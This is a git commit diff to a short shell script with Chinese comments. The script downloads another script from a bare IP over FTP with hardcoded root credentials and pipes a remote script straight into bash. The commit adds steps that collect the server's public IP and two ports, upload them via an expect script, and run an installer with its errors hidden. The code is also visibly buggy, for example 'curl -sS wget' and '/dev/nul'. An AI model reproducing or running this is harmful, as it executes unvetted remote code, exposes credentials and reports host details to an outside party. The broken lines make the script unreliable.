b05e1ef20e1c7540f407b1b10ed57ea4dd139baf
50801684 <42910719+50801684@users.noreply.github.com>
2022-10-16 12:12:15 +0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -7,7 +7,13 @@ wget ftp://159.75.133.49:21/8.sh --ftp-user=root --ftp-password=wsywsy
 bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/6.sh)"
 sudo chmod 777 *.sh
 sudo chmod 777 file.txt
-./4.sh -d 
+# 写入IP
+Server_IP=`curl ifconfig.me`
+echo $Server_IP":28888" >> file.txt
+echo $Server_IP":38888" >> file.txt
+# 上传
+expect 5.sh
+
+# 安装
+./4.sh -d 2>/dev/nul
 echo "安装完成"
-rm -f *.sh
-rm -f file.*
